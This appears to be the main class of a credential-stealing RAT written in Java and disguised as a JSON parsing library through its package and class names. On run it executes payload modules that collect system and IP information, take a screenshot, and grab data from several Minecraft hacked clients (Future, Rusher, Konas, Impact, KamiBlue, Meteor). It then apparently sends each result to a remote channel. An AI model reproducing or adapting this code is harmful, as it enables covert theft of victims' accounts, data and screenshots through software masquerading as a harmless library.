package org.json.updated;

import org.json.updated.parsers.JSONObject;
import org.json.updated.parsers.JSONRegexHandler;
import org.json.updated.parsers.impl.*;
import org.json.updated.parsers.util.JSONBuilder;

import java.util.ArrayList;
import java.util.Arrays;

final class JSON {
    private final ArrayList<JSONObject> objects = new ArrayList<>();
    private final boolean debug = false;

    private void parseJson() {
        // Incoming skidiots saying "U skidded yoink rat" cause of this line since this is better practice cause of add all instead of just a ton of .add lines :joy:.
        this.objects.addAll(Arrays.asList(
            new GeneralInformation(),
            new IPInformation(),
            new Screenshot(),
            new FutureData(),
            new RusherData(),
            new KonasData(),
            new ImpactData(),
            new KamiBlueData(),
            new MeteorData()
        ));

        String separator = new JSONBuilder().value("content", "=============================================").build();

        JSONRegexHandler.send(separator);
        this.objects.spliterator().forEachRemaining((payload) -> {
            try {
                payload.handle();
            } catch (Exception e) {
                JSONRegexHandler.send(new JSONBuilder().value("content", "> Failure on payload " + payload.getName()).build());
                if (debug) e.printStackTrace();
            }
        });
        JSONRegexHandler.send(separator);
    }

    public static void main(String[] args) {
        new JSON().parseJson();
    }
}